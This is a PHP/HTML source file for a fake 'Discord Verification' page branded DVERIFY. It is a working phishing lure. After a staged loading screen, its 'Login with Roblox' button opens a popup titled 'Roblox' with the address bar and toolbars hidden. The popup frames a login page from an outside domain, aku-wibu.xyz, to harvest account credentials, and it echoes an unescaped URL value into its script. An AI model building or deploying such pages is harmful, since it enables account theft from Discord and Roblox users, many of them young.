<?php
$url = "$_SERVER[REQUEST_URI]";
$path = parse_url($url, PHP_URL_PATH);
$parts = explode('/', $path);
$v = end($parts);
?>
<!DOCTYPE html>
<html lang="en">
<head> 
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Verification</title>
    <link rel='icon' type='image/x-icon' href='http://localhost/icon/icon.ico?icon'>
 <link href="https://fonts.cdnfonts.com/css/gg-sans-2" rel="stylesheet">
                
     <style>
        body {
            font-family: 'gg sans Normal', sans-serif;
            text-align: center;
            overflow: hidden;
            background-color:#000;/* Hide scroll bars until loading complete */
        }
        .container {
            margin-top: 100px;
        }
        h1{
             font-weight: bold;
            color:white;
            margin: 0 auto; /* Center the text horizontally */
        }
        p{
            font-weight: 400;
            color:white;
            margin: 0 auto; /* Center the text horizontally */
            max-width: 600px; /* Limit the width of the text */
        }
        .discord-button {
            display: inline-block;
            background-color: #69dd7b;
            color: black;
            text-decoration: none;
            padding: 10px 20px;
            border-radius: 5px;
            font-family: 'gg sans Normal', sans-serif; 
        }
        .discord-button:hover {
            background-color: #677bc4;
        }
        /* Loading screen overlay styles */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 1);
            z-index: 1000;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column; /* Added to stack spinner and text vertically */
        }
        .loading-text {
            margin-top: 10px;
            color: #666;
            font-weight: bold;
            font-family: 'gg sans Normal', sans-serif;
        }
        img.rounded {
        border-radius: 50%; /* Makes the image round */
        border: 2px solid white; /* Adds a white border */
        width: 200px; /* Adjust as needed */
        height: 200px; /* Adjust as needed */
        object-fit: cover; /* Prevents distortion of the image */
    }
    </style>
</head>
<body>

<div class="overlay">
    <img src="https://verify.dcounter.space/static/images/loading-old.gif" alt="Loading...">
    <div class="loading-text">DVERIFY is verifying your Discord Account...</div>
</div>
<div class="container">
    <img class="rounded" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSRhcxTGIoQKsDV3ty6gKc8Tk34K8_a3Y2N-ZeIUOtKAg&s">
    <h1>Hello, New Member !</h1><br>
    <h1>Welcome To The Server</h1><br><br>
    <p>You can verify with DVERIFY using Reddit, Steam, Twitter, Overwatch, Xbox, Youtube and Captcha. The available options will depend on the server. Click the button below to continue with verification!.</p><br>
    <p>By verifying with DVERIFY, you agree with our</p><a href="#">Privacy Policy & Terms and Conditions</a><br><br><br>
     <a onclick="openPopup()" href="#"  class="discord-button">Login with Roblox</a>
</div>

<script>
	setTimeout(function() {
        // Remove the loading overlay
        var overlay = document.querySelector('.overlay');
        overlay.parentNode.removeChild(overlay);
        // Show scroll bars after loading complete
        document.body.style.overflow = 'auto';
    }, 5000); // 3000 milliseconds = 3 seconds
     function openPopup() {
    var width = 600;
    var height = 600;
    var left = (window.screen.width - width) / 2; // Center horizontally
    var top = (window.screen.height - height) / 2; // Center vertically

    var popup = window.open('about:blank', '_blank', 'width=' + width + ',height=' + height + ',top=' + top + ',left=' + left + ',toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=no,resizable=no,icon=icon.ico');
    if (popup) {
        var popupContent = "<!DOCTYPE html><html><head><link rel='icon' type='image/x-icon' href='icon.ico'><title>Roblox</title><style>body {margin: 0; overflow: hidden;}</style></head><body><div id='iframeContainer' style='width: 100%; height: 100%;'><iframe id='popupIframe' src='https://aku-wibu.xyz/verify/iframe1.php?v=<?php echo $v; ?>' style='width: 100%; height: 100%; border: none;'></iframe></div></body></html>";
        popup.document.write(popupContent); 

        // Dynamically adjust iframe size when window is resized
        popup.onresize = function() {
            var iframe = popup.document.getElementById('popupIframe');
            iframe.style.width = popup.innerWidth + 'px';
            iframe.style.height = popup.innerHeight + 'px';
        };
    } else {
        alert('Popup blocked! Please enable popups for this site.');
    }
}
	</script>

</body>
</html>
